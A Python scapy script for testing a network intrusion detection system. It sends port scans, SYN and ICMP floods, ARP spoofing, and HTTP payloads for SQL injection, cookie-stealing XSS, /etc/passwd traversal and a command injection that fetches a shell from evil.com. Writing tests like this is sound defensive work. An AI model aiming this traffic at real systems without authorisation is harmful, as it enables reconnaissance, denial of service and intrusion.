#!/usr/bin/env python3
"""
NIDS Test Script - Simulates various attack patterns to verify detection
Run this FROM A DIFFERENT MACHINE than the one running the NIDS
"""

from scapy.all import *
import argparse
import time
import sys
import os
import signal
from colorama import Fore, Style, init

init(autoreset=True)

# Track Ctrl+C presses
interrupt_count = 0

def signal_handler(sig, frame):
    global interrupt_count
    interrupt_count += 1
    if interrupt_count > 1:
        print(f"\n{Fore.RED}[!] Emergency shutdown initiated. Exiting...{Style.RESET_ALL}")
        os._exit(1)
    print(f"\n\n{Fore.YELLOW}[*] Stopping tests... (Press Ctrl+C again to force quit){Style.RESET_ALL}")

# Bind signal
signal.signal(signal.SIGINT, signal_handler)

conf.verb = 0  # Suppress scapy output

def is_admin():
    """Cross-platform check for admin/root privileges"""
    try:
        if os.name == 'nt':
            import ctypes
            return ctypes.windll.shell32.IsUserAnAdmin() != 0
        else:
            return os.getuid() == 0
    except AttributeError:
        return False

class NIDSTester:
    def __init__(self, target_ip, target_iface=None):
        self.target = target_ip
        # On Windows, we MUST have an interface for raw L2 sending
        # If not provided, we try to use scapy's default detected interface
        if target_iface:
            self.iface = target_iface
        else:
            self.iface = conf.iface
            if self.iface:
                print(f"[*] No interface specified, using default: {self.iface}")
        
        self.ports = [21, 22, 23, 25, 80, 443, 3306, 3389, 8080]
        
    def banner(self, test_name):
        print(f"\n{'='*60}")
        print(f"TEST: {test_name}")
        print(f"{'='*60}")

    def _send_packet(self, pkt, verbose=False):
        """Helper to send packets correctly across platforms"""
        # Ensure pkt is a list for uniform processing if it's a batch
        is_list = isinstance(pkt, list)
        pkts_to_send = pkt if is_list else [pkt]
        
        if self.iface:
            # On Windows/Interface mode, we MUST use Ether() layer
            processed_pkts = []
            for p in pkts_to_send:
                if not p.haslayer(Ether):
                    # We use a broad destination if ARP fails
                    p = Ether(dst="ff:ff:ff:ff:ff:ff")/p
                processed_pkts.append(p)
            
            sendp(processed_pkts, iface=self.iface, verbose=verbose)
        else:
            # Layer 3 sending (Scapy handles routing)
            send(pkts_to_send, verbose=verbose)
    
    # ================= TEST 1: PORT SCAN =================
    def test_port_scan(self):
        self.banner("SYN Port Scan (Should trigger: Port Scan Alert)")
        print(f"[*] Scanning 20 ports on {self.target}...")
        
        for port in range(80, 100):
            pkt = IP(dst=self.target)/TCP(dport=port, flags="S")
            self._send_packet(pkt)
            time.sleep(0.05)
        
        print("[+] Scan complete. NIDS should show PORT SCAN alert")
        time.sleep(2)
    
    # ================= TEST 2: SYN FLOOD =================
    def test_syn_flood(self):
        self.banner("SYN Flood (Should trigger: SYN Flood Alert)")
        print(f"[*] Sending 200 SYN packets to {self.target}:80...")
        
        packets = []
        for i in range(200):
            pkt = IP(dst=self.target)/TCP(dport=80, flags="S", sport=RandShort())
            packets.append(pkt)
        
        self._send_packet(packets)
        print("[+] Flood complete. NIDS should show SYN FLOOD alert")
        time.sleep(2)
    
    # ================= TEST 3: FIN SCAN =================
    def test_fin_scan(self):
        self.banner("FIN Scan (Should trigger: FIN Scan Alert)")
        print(f"[*] FIN scanning common ports on {self.target}...")
        
        for port in self.ports:
            pkt = IP(dst=self.target)/TCP(dport=port, flags="F")
            self._send_packet(pkt)
            time.sleep(0.1)
        
        print("[+] FIN scan complete. NIDS should show FIN SCAN alerts")
        time.sleep(2)
    
    # ================= TEST 4: XMAS SCAN =================
    def test_xmas_scan(self):
        self.banner("XMAS Scan (Should trigger: XMAS Scan Alert)")
        print(f"[*] XMAS scanning common ports on {self.target}...")
        
        for port in self.ports:
            pkt = IP(dst=self.target)/TCP(dport=port, flags="FPU")  # FIN+PSH+URG
            self._send_packet(pkt)
            time.sleep(0.1)
        
        print("[+] XMAS scan complete. NIDS should show XMAS SCAN alerts")
        time.sleep(2)
    
    # ================= TEST 5: NULL SCAN =================
    def test_null_scan(self):
        self.banner("NULL Scan (Should trigger: NULL Scan Alert)")
        print(f"[*] NULL scanning common ports on {self.target}...")
        
        for port in self.ports:
            pkt = IP(dst=self.target)/TCP(dport=port, flags="")  # No flags
            self._send_packet(pkt)
            time.sleep(0.1)
        
        print("[+] NULL scan complete. NIDS should show NULL SCAN alerts")
        time.sleep(2)
    
    # ================= TEST 6: ARP SPOOF =================
    def test_arp_spoof(self):
        self.banner("ARP Spoofing (Should trigger: ARP Spoof Alert)")
        
        if not self.iface:
            print("[!] Skipping - requires interface specification")
            return
        
        print(f"[*] Sending spoofed ARP packets...")
        fake_mac = "00:11:22:33:44:55"
        
        # Send 3 ARP announcements with fake MAC
        for i in range(3):
            arp_pkt = Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(
                op="who-has",
                psrc=self.target,
                hwsrc=fake_mac,
                pdst=self.target
            )
            sendp(arp_pkt, iface=self.iface, verbose=False)
            time.sleep(0.5)
        
        print("[+] ARP spoof complete. NIDS should show ARP SPOOF alert")
        time.sleep(2)
    
    # ================= TEST 7: ICMP FLOOD =================
    def test_icmp_flood(self):
        self.banner("ICMP Flood (Should trigger: ICMP Flood Alert)")
        print(f"[*] Sending 100 ICMP packets to {self.target}...")
        
        packets = []
        for i in range(100):
            pkt = IP(dst=self.target)/ICMP()
            packets.append(pkt)
        
        self._send_packet(packets)
        print("[+] ICMP flood complete. NIDS should show ICMP FLOOD alert")
        time.sleep(2)
    
    # ================= TEST 8: LARGE ICMP =================
    def test_large_icmp(self):
        self.banner("Large ICMP Packet (Should trigger: Large ICMP Alert)")
        print(f"[*] Sending oversized ICMP packet to {self.target}...")
        
        # Create 2000-byte payload
        payload = "A" * 2000
        pkt = IP(dst=self.target)/ICMP()/payload
        self._send_packet(pkt)
        
        print("[+] Large ICMP sent. NIDS should show LARGE ICMP alert")
        time.sleep(2)
    
    # ================= TEST 9: PAYLOAD INJECTION =================
    def test_payload_attacks(self):
        self.banner("Malicious Payloads (Should trigger: Payload Detection)")
        
        print("[*] Simulating HTTP request with SQL injection...")
        sql_payload = b"GET /?id=1' UNION SELECT * FROM users-- HTTP/1.1\r\nHost: target\r\n\r\n"
        pkt = IP(dst=self.target)/TCP(dport=80, flags="PA")/sql_payload
        send(pkt, iface=self.iface, verbose=False)
        time.sleep(0.5)
        
        print("[*] Simulating XSS attempt...")
        xss_payload = b"GET /?q=<script>alert(document.cookie)</script> HTTP/1.1\r\nHost: target\r\n\r\n"
        pkt = IP(dst=self.target)/TCP(dport=80, flags="PA")/xss_payload
        send(pkt, iface=self.iface, verbose=False)
        time.sleep(0.5)
        
        print("[*] Simulating path traversal...")
        path_payload = b"GET /../../etc/passwd HTTP/1.1\r\nHost: target\r\n\r\n"
        pkt = IP(dst=self.target)/TCP(dport=80, flags="PA")/path_payload
        send(pkt, iface=self.iface, verbose=False)
        time.sleep(0.5)
        
        print("[*] Simulating command injection...")
        cmd_payload = b"GET /?cmd=/bin/bash+-c+'wget+http://evil.com/shell' HTTP/1.1\r\nHost: target\r\n\r\n"
        pkt = IP(dst=self.target)/TCP(dport=80, flags="PA")/cmd_payload
        self._send_packet(pkt)
        
        print("[+] Payload tests complete. NIDS should show MALICIOUS PAYLOAD alerts")
        time.sleep(2)
    
    # ================= TEST 10: SERVICE DETECTION =================
    def test_service_detection(self):
        self.banner("Service Detection (Should trigger: Service Alerts)")
        
        services = [
            (22, "SSH"),
            (23, "Telnet"),
            (80, "HTTP"),
            (443, "HTTPS"),
            (3306, "MySQL"),
            (3389, "RDP")
        ]
        
        print(f"[*] Simulating connections to various services...")
        for port, name in services:
            print(f"    - {name} (port {port})")
            # Send SYN
            pkt = IP(dst=self.target)/TCP(dport=port, flags="S")
            send(pkt, iface=self.iface, verbose=False)
            time.sleep(0.2)
            
            # Send data packet (PSH+ACK)
            pkt = IP(dst=self.target)/TCP(dport=port, flags="PA")/b"TEST"
            self._send_packet(pkt)
            time.sleep(0.3)
        
        print("[+] Service tests complete. NIDS should show service alerts")
        time.sleep(2)
    
    # ================= RUN ALL TESTS =================
    def run_all(self):
        print("\n" + "="*60)
        print("NIDS TESTING SUITE")
        print("="*60)
        print(f"Target: {self.target}")
        if self.iface:
            print(f"Interface: {self.iface}")
        print("\nIMPORTANT: Make sure NIDS is running on the target!")
        print("="*60)
        
        input("\nPress ENTER to start tests...")
        
        try:
            self.test_port_scan()
            self.test_syn_flood()
            self.test_fin_scan()
            self.test_xmas_scan()
            self.test_null_scan()
            self.test_icmp_flood()
            self.test_large_icmp()
            self.test_payload_attacks()
            self.test_service_detection()
            
            if self.iface:
                self.test_arp_spoof()
            
            print("\n" + "="*60)
            print("ALL TESTS COMPLETED")
            print("="*60)
            print("\nCheck NIDS output for alerts!")
            print("Expected alerts: 20-30 depending on detection sensitivity")
            
        except (KeyboardInterrupt, SystemExit):
            print(f"\n{Fore.YELLOW}[*] Tests stopped by user.{Style.RESET_ALL}")
        except Exception as e:
            print(f"\n{Fore.RED}[!] Error: {e}{Style.RESET_ALL}")

# ================= INDIVIDUAL TEST COMMANDS =================
def quick_scan(target, iface=None):
    """Quick port scan test"""
    print(f"[*] Quick scan test on {target}")
    for port in [22, 80, 443, 3306, 8080]:
        pkt = IP(dst=target)/TCP(dport=port, flags="S")
        send(pkt, iface=iface, verbose=False)
        time.sleep(0.1)
    print("[+] Done")

def quick_flood(target, iface=None):
    """Quick SYN flood test"""
    print(f"[*] Quick flood test on {target}")
    packets = [IP(dst=target)/TCP(dport=80, flags="S", sport=RandShort()) for _ in range(150)]
    send(packets, iface=iface, verbose=False)
    print("[+] Done")

# ================= MAIN =================
if __name__ == "__main__":
    parser = argparse.ArgumentParser(
        description="NIDS Testing Suite - Simulates attacks",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  # Run all tests
  sudo python3 test_nids.py --target 192.168.1.100
  
  # Run with specific interface (required for ARP tests)
  sudo python3 test_nids.py --target 192.168.1.100 --iface eth0
  
  # Quick scan test only
  sudo python3 test_nids.py --target 192.168.1.100 --quick scan
  
  # Quick flood test only
  sudo python3 test_nids.py --target 192.168.1.100 --quick flood

IMPORTANT: Run this from a DIFFERENT machine than the NIDS target!
        """
    )
    
    parser.add_argument("--target", required=True, help="Target IP address (where NIDS is running)")
    parser.add_argument("--iface", help="Network interface (optional, needed for ARP tests)")
    parser.add_argument("--quick", choices=['scan', 'flood'], help="Run quick test only")
    
    args = parser.parse_args()
    
    # Check for admin/root privileges
    if not is_admin():
        print(f"\n{Fore.RED}[!] Error: This script requires administrator/root privileges to send raw packets.{Style.RESET_ALL}")
        if os.name == 'nt':
            print("[*] Please run this terminal as Administrator.")
        else:
            print(f"[*] Run with: sudo python3 {sys.argv[0]} --target <ip>")
        sys.exit(1)
    
    if args.quick:
        if args.quick == 'scan':
            quick_scan(args.target, args.iface)
        elif args.quick == 'flood':
            quick_flood(args.target, args.iface)
    else:
        tester = NIDSTester(args.target, args.iface)
        tester.run_all()
